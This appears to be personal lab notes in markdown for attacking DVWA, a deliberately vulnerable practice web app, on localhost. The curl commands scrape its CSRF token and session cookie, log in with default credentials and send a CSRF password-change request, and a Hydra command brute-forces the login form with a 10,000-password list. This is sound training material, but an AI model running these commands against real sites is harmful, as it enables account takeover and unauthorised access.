# Login & cookie

use DVWA as example page

### get csrf token

```bash
curl -s -L -c cookies.txt -b cookies.txt "<host>" | grep <keyword>  | grep -oE \'\[a-z0-9\]+\' | awk 'length >= 10'
```

```bash
curl -s -L -c cookies.txt -b cookies.txt "http://localhost:8086/login.php" | grep user_token  | grep -oE \'\[a-z0-9\]+\' | awk 'length >= 10'
```

```bash
curl -s -L -c cookies.txt -b cookies.txt "http://localhost:8086/login.php" | grep user_token  | grep -oE \[a-z0-9\]+ | awk 'length >= 10'
```

### 🔹 get csrf token from cookie

```bash
CSRF=`curl -s -L -c cookies.txt -b cookies.txt "http://localhost:8086/login.php" | grep user_token  | grep -oE \[a-z0-9\]+ | awk 'length >= 10'`
```

### 🔸 get session from cookie

```bash
SESSIONID=$(grep PHPSESSID cookies.txt | cut -d $'\t' -f7)
```

### login and create cookie

```bash
curl -v -L \
-c cookies.txt -b cookies.txt \
-X POST $HOST \
--data-raw \
"username=${USER}&password=${PASSWORD}&Login=Login&user_token=${CSRF}"
```

```bash
curl -v -L -c cookies.txt -b cookies.txt -X POST "http://localhost:8086/login.php" --data-raw "username=admin&password=password&Login=Login&user_token=${CSRF}"
```

### 🔑 send request with cookie

```bash
curl -v -c cookies.txt -b cookies.txt "http://localhost:8086/vulnerabilities/csrf/?password_new=111&password_conf=111&Change=Change#"
```

### 👉 Work with Hydra

```bash
hydra -V -l admin -P 10-million-password-list-top-10000.txt -s 8086 -f localhost http-form-get "/vulnerabilities/brute/?:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=${SESSIONID}; security=low"
```

### more examples:

```bash
curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "192.168.1.44/DVWA/login.php" >/dev/null
```

---

# Ref

DVWA - Brute Force (Medium Level) - Time Delay - g0tmi1k
[https://blog.g0tmi1k.com/dvwa/bruteforce-medium/#L.strong.Hydra..strong](https://blog.g0tmi1k.com/dvwa/bruteforce-medium/#L.strong.Hydra..strong).

```bash
curl -s -b 'security=low' -b dvwa.cookie 'http://localhost:8086/vulnerabilities/brute/' | sed -n '/<div class="body_padded/,/<\/div/p' > low.txt
```

```bash
curl -s -b 'security=medium' -b dvwa.cookie 'http://localhost:8086/vulnerabilities/brute/' | sed -n '/<div class="body_padded/,/<\/div/p' > medium.txt
```

```bash
diff {low,medium}.txt
```

```bash
curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "192.168.1.44/DVWA/login.php" >/dev/null
```
